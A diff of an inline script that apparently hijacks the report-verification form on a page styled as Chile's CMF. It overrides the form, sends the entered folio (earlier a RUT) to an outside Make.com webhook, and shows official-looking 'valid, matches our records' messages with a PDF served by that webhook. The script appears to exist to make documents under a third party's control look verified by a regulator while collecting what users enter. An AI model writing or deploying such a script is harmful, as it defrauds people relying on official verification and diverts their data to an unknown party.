@@ -1,48 +1,89 @@
-<script id="copilot-cmf-rut-nombre">
+<script id="copilot-cmf-folio">
 (function(){
 	function init(){
-	var WEBHOOK_URL='https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
-	var form=document.querySelector('form');
-	var rut=document.getElementById('rut');
-	var btn=document.getElementById('verificarInforme');
-	if(!form||!rut||!btn) return;
-	var status=document.createElement('div');
-	status.style.cssText='margin:12px 0;font-weight:700;';
-	form.appendChild(status);
-	var result=document.createElement('div');
-	result.style.cssText='margin:12px 0;display:none;';
-	status.insertAdjacentElement('afterend',result);
-	function esc(v){return String(v||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;').replace(/'/g,'&#39;');}
-	function pick(data,keys){for(var i=0;i<keys.length;i++){var value=data[keys[i]];if(typeof value==='string'&&value.trim())return value.trim();}return '';}
-	function documentUrl(data){var pdf=pick(data,['pdf','pdfBase64','pdf_base64','fileBase64','archivoBase64']);if(pdf)return pdf.indexOf('data:')===0?pdf:'data:application/pdf;base64,'+pdf;return pick(data,['url','fileUrl','file_url','link','downloadUrl','download_url','publicUrl','public_url']);}
-	function renderFound(data){
-		var url=documentUrl(data);
-		var name=pick(data,['name','fileName','file_name','filename','title'])||'informe-validado.pdf';
-		result.style.display='block';
-		result.innerHTML='<div style="margin:12px 0;padding:14px;border:1px solid #198754;border-radius:4px;background:#f2fff6;color:#1b1b1b;line-height:1.5;">ATENCION: El informe de correlativo ingresado para el RUT y periodo de deudas consultado ha sido verificado y la información contenida en él <strong>SI</strong> corresponde a nuestros registros. Si lo desea, <strong>para verificar montos</strong>, puede descargar el archivo validado desde el siguiente botón:<br><br>'+(url?'<a href="'+esc(url)+'" target="_blank" rel="noopener noreferrer" download="'+esc(name)+'" style="display:inline-block;background:#41659c;color:#fff;padding:8px 18px;text-decoration:none;border-radius:4px;font-weight:700;">VER INFORME</a>':'<span style="color:#b00020;">El documento validado no fue incluido en la respuesta.</span>')+'</div>';
+		var webhookUrl='https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
+		var form=document.getElementById('validar_informe');
+		var folio=document.getElementById('nro_correlativo');
+		var button=document.getElementById('verificarInforme');
+		var clearButton=document.getElementById('cleanVerificar');
+		if(!form||!folio||!button) return;
+
+		form.noValidate=true;
+		Array.prototype.forEach.call(form.querySelectorAll('[required]'),function(field){
+			if(field!==folio) field.required=false;
+		});
+		folio.type='text';
+		folio.inputMode='text';
+		folio.autocomplete='off';
+		folio.required=true;
+
+		var status=document.createElement('div');
+		status.setAttribute('role','status');
+		status.style.cssText='margin:12px 0;font-weight:700;';
+		form.appendChild(status);
+
+		var result=document.createElement('div');
+		result.style.cssText='margin:12px 0;display:none;';
+		status.insertAdjacentElement('afterend',result);
+
+		function showMessage(message,color){
+			status.style.color=color;
+			status.textContent=message;
+		}
+
+		function downloadPdf(base64,filename){
+			var clean=base64.replace(/^data:application\/pdf;base64,/i,'').replace(/\s+/g,'');
+			var binary=atob(clean);
+			var bytes=new Uint8Array(binary.length);
+			for(var index=0;index<binary.length;index++) bytes[index]=binary.charCodeAt(index);
+			var objectUrl=URL.createObjectURL(new Blob([bytes],{type:'application/pdf'}));
+			var anchor=document.createElement('a');
+			anchor.href=objectUrl;
+			anchor.download=/\.pdf$/i.test(filename||'')?filename:(filename||'informe-validado')+'.pdf';
+			document.body.appendChild(anchor);
+			anchor.click();
+			anchor.remove();
+			setTimeout(function(){URL.revokeObjectURL(objectUrl);},2000);
+		}
+
+		form.addEventListener('submit',function(event){
+			event.preventDefault();
+			var code=folio.value.trim();
+			result.style.display='none';
+			result.textContent='';
+			if(!code){showMessage('Ingrese el Informe Correlativo/Folio N°.','#b00020');folio.focus();return;}
+
+			button.disabled=true;
+			showMessage('Consultando informe...','#0054ab');
+			var payload={entity:'cmf',codigo:code,cve:code,documentId:code,query:code,nombre:code,name:code,searchName:code,fileName:code,source:'CMF-INFORME-CORRELATIVO'};
+
+			fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(payload)})
+				.then(function(response){
+					if(!response.ok) throw new Error('HTTP '+response.status);
+					return response.json();
+				})
+				.then(function(data){
+					if(data&&data.found&&typeof data.pdf==='string'&&data.pdf.trim()){
+						downloadPdf(data.pdf,data.name);
+						showMessage('Documento válido y encontrado. Se inició la descarga del informe.','#198038');
+						return;
+					}
+					result.style.cssText='display:block;margin:12px 0;padding:14px;border:1px solid #b00020;border-radius:4px;background:#fff7f7;color:#1b1b1b;line-height:1.5;';
+					result.textContent='ATENCIÓN: No se encontró un informe asociado al folio ingresado.';
+					showMessage('No se encontró el informe.','#b00020');
+				})
+				.catch(function(error){
+					console.error(error);
+					showMessage('Error al consultar el informe. Intente nuevamente.','#b00020');
+				})
+				.finally(function(){button.disabled=false;});
+		});
+
+		if(clearButton) clearButton.addEventListener('click',function(){
+			setTimeout(function(){status.textContent='';result.style.display='none';},0);
+		});
 	}
-	function renderNotFound(){
-		result.style.display='block';
-		result.innerHTML='<div style="margin:12px 0;padding:14px;border:1px solid #b00020;border-radius:4px;background:#fff7f7;color:#1b1b1b;line-height:1.5;">ATENCION: El informe de correlativo ingresado para el RUT y periodo de deudas consultado ha sido verificado y la información contenida en él <strong>NO</strong> corresponde a nuestros registros.</div>';
-	}
-	form.addEventListener('submit',function(e){
-		e.preventDefault();
-		var value=rut.value.trim();
-		if(!value){status.style.color='#b00020';status.textContent='Ingrese RUT.';result.style.display='none';return;}
-		btn.disabled=true;status.style.color='#0054ab';status.textContent='Consultando informe...';result.style.display='none';result.innerHTML='';
-		var payload={entity:'cmf',nombre:value,name:value,searchName:value,rut:value,documentId:value,codigo:value,timestamp:new Date().toISOString()};
-		fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
-			.then(function(r){return r.text();})
-			.then(function(raw){
-				var data={};try{data=raw?JSON.parse(raw):{};}catch(x){data={message:raw};}
-				var found=data.found||data.encontrado||data.exists||data.ok||data.pdf||data.pdfBase64||data.url||data.fileUrl;
-				if(found){status.style.color='#198038';status.textContent='Documento valido y vigente';renderFound(data);}
-				else{status.style.color='#0054ab';status.textContent='';renderNotFound();}
-			})
-			.catch(function(){status.style.color='#b00020';status.textContent='Error al consultar el informe.';})
-			.finally(function(){btn.disabled=false;});
-	});
-	}
+
 	if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',init); else init();
 })();
 </script>
